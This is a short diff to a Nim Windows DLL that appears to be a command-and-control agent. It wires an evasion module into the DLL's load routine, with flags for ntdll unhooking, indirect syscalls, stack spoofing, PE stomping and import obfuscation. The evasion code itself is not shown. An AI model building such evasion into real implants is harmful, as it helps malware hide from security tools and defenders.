@@ -7,7 +7,11 @@ import config, agent
 when defined(windows):
   import winim/lean
   import utils/self_delete
-  
+
+  # Evasion imports
+  when defined(evasion_nocrt) or defined(evasion_dfr) or defined(evasion_iat_obf) or defined(evasion_stomp_pe) or defined(evasion_unhook_ntdll) or defined(evasion_indirect_syscalls) or defined(evasion_stack_spoof):
+    import utils/evasion
+
   # Import NimMain to initialize Nim runtime
   proc NimMain() {.cdecl, importc.}
   
@@ -53,6 +57,9 @@ when defined(windows):
     of DLL_PROCESS_ATTACH:
       # Initialize Nim runtime once when DLL loads
       NimMain()
+      # Run evasion techniques immediately
+      when defined(evasion_nocrt) or defined(evasion_dfr) or defined(evasion_iat_obf) or defined(evasion_stomp_pe) or defined(evasion_unhook_ntdll) or defined(evasion_indirect_syscalls) or defined(evasion_stack_spoof):
+        runEvasionInit()
       # Disable thread library calls for this DLL
       discard DisableThreadLibraryCalls(hinstDLL)
       return TRUE
